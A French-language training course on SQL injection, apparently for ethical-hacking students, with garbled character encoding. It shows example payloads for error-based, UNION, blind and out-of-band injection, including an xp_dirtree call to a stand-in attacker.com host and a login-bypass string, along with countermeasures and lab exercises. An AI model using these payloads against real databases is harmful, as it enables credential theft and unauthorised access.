
# üíâ Cours sur l'Injection SQL (SQL Injection)

> _Comprendre, d√©tecter et exploiter les vuln√©rabilit√©s SQL les plus courantes._

---

## üìò Introduction

Le **SQL Injection** (SQLi) est une vuln√©rabilit√© critique qui permet √† un attaquant de manipuler les requ√™tes SQL ex√©cut√©es par une application. Cela peut entra√Æner la fuite d'informations sensibles, la modification de donn√©es ou m√™me un contr√¥le total de la base de donn√©es.

---

## üîç Objectifs du cours

- Comprendre le fonctionnement de SQL
- Identifier les types d'injections SQL
- Apprendre √† les exploiter
- Conna√Ætre les contremesures

---

## üß± Types de SQL Injection

### 1Ô∏è‚É£ In-Band SQL Injection

L'injection est visible directement dans la r√©ponse de la page.

#### a. Error-Based SQLi

- Exploite les messages d‚Äôerreur SQL
- Utilise les erreurs pour r√©v√©ler des informations internes

**Exemple** :
```sql
' AND 1=CONVERT(int, (SELECT @@version))--
```

#### b. Union-Based SQLi

- Utilise `UNION SELECT` pour fusionner des r√©sultats

**Exemple** :
```sql
' UNION SELECT username, password FROM admin--
```

---

### 2Ô∏è‚É£ Inferential (Blind) SQL Injection

L‚Äôapplication ne montre pas d‚Äôerreur. L‚Äôattaquant d√©duit les r√©sultats par observation du comportement.

#### a. Boolean-Based

**Exemple** :
```sql
' AND 1=1--  ‚Üí page normale  
' AND 1=2--  ‚Üí page blanche ou diff√©rente
```

#### b. Time-Based

**Exemple** :
```sql
'; IF (SUBSTRING(@@version,1,1)='5') WAITFOR DELAY '00:00:05'--
```

‚û°Ô∏è Si la r√©ponse prend 5 secondes ‚Üí condition vraie

---

### 3Ô∏è‚É£ Out-of-Band SQL Injection (OOB)

Utilise un canal externe (ex: DNS, HTTP) pour extraire les donn√©es.

**Exemple** :
```sql
'; exec xp_dirtree '\attacker.com\share'--
```

---

## üß™ Exemple d'application vuln√©rable

```sql
SELECT * FROM users WHERE username = '$user' AND password = '$pass'
```

Si `$user` = `' OR '1'='1`, la requ√™te devient :

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '$pass'
```

‚û°Ô∏è L'acc√®s est accord√© sans authentification.

---

## üõ°Ô∏è Contremesures

- ‚ùå Ne jamais concat√©ner les entr√©es utilisateur
- ‚úÖ Utiliser des **requ√™tes pr√©par√©es / param√©tr√©es**
- ‚úÖ Utiliser des **ORM s√©curis√©s** (ex: SQLAlchemy, Entity Framework)
- üîê Mettre en place un WAF (Web Application Firewall)
- ‚úÖ Limiter les droits SQL de l'application

---

## üõ†Ô∏è Outils utiles

| Outil       | Description                         |
|-------------|-------------------------------------|
| sqlmap      | Automatisation compl√®te des attaques |
| Burp Suite  | Interception et tests manuels       |
| sqlninja    | SQLi + Post Exploitation MSSQL      |
| jSQL        | Interface graphique d'injection     |

---

## üéØ R√©sum√©

| Type         | D√©tails                           |
|--------------|------------------------------------|
| In-Band      | R√©sultat visible (erreur, union)   |
| Blind        | Comportement observ√©               |
| Out-of-Band  | Exfiltration via autre protocole   |

---

## üìö Pour aller plus loin

- [PayloadAllTheThings ‚Äì SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)

---

## üß† Exercice conseill√©

- Trouver une application vuln√©rable (ex: DVWA, bWAPP)
- Tester tous les types d‚Äôinjection
- Utiliser `sqlmap` pour automatiser
- √âcrire un rapport de vuln√©rabilit√©

---

> R√©dig√© avec ‚ù§Ô∏è pour les hackers √©thiques en formation.
